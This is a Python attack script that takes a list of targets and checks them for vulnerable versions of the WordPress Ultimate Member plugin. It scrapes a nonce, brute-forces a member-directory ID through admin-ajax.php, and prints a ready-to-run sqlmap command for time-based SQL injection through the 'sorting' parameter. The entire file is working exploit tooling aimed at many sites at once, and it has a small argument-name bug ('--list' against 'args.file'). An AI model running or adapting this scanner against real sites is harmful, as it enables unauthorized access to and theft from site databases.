import re
import sys
import urllib3
import hashlib
import requests
import argparse
from colorama import Fore, Style
from pystyle import Colors, Colorate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BOLD = '\033[1m'
RESET = '\033[0m'


ascii_art = '''

█▀▀ █▀█ █░█ █▄░█ █▀▄ █▀ █▀▀ █▀▀
█▀░ █▄█ █▄█ █░▀█ █▄▀ ▄█ ██▄ █▄▄
'''
print(Colorate.Vertical(Colors.green_to_white, ascii_art, 2))

def check_version(target):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Checking site version for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        print(Fore.RED + f'Error 404 - Version not found!')
        return None

    if int(version.replace('.','')) > 212 and int(version.replace('.','')) < 283:
        print(Fore.GREEN + f'{version} - ✅ Vulnerable!')
        return version
    else:
        print(Fore.RED + f'{version} - ❎ Not Vulnerable!')
        return None

def get_nonce(target):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Getting nonce for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    s = requests.Session()
    try:
        r = s.get(f'{target}/index.php/register/', verify=False)
        nonce = re.search(r'um_scripts\s*=\s*\{[^}]*"nonce":"([^"]+)"', r.text).groups()[0]
        print(Fore.GREEN + f"{nonce}")
        return nonce
    except:
        print(Fore.RED + f'Error 404 - Nonce not found!')
        return None

def get_directory_id(target, nonce):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Searching for valid directory ID for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    for num in range(1, 100):
        id = hashlib.md5(str(num).encode()).hexdigest()[10:15]
        payload = {
            "action": "um_get_members",
            "nonce": nonce,
            "directory_id": id
        }

        response = requests.post(f'{target}/wp-admin/admin-ajax.php', data=payload)
        if response.status_code == 200:
            if '"success":true' in response.text:
                print(Fore.GREEN + f"{id}")
                return id

    print(Fore.RED + f'Error 404 - Valid directory ID not found!')
    return None

def scan_target(target):
    print()
    print(Fore.BLUE + f"\t--- Scanning {Fore.YELLOW}{target}{Fore.RESET} ---")
    version = check_version(target)
    if version:
        nonce = get_nonce(target)
        if nonce:
            dir_id = get_directory_id(target, nonce)
            if dir_id:
                data = f'action=um_get_members&nonce={nonce}&directory_id={dir_id}&sorting=user_login'
                print()
                print(Fore.GREEN + f"Vulnerable! {target} Check it with SQL tools:")
                print(Fore.YELLOW + f'Run: sqlmap -u {target}/wp-admin/admin-ajax.php --method POST --data "{data}" --dbms mysql --technique=T -p sorting')

parser = argparse.ArgumentParser()

parser.add_argument('-l', '--list', help='FILE CONTAINING LIST OF TARGET')

if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

if args.file:
    with open(args.file, 'r') as file:
        urls = file.readlines()
        for url in urls:
            scan_target(url.strip())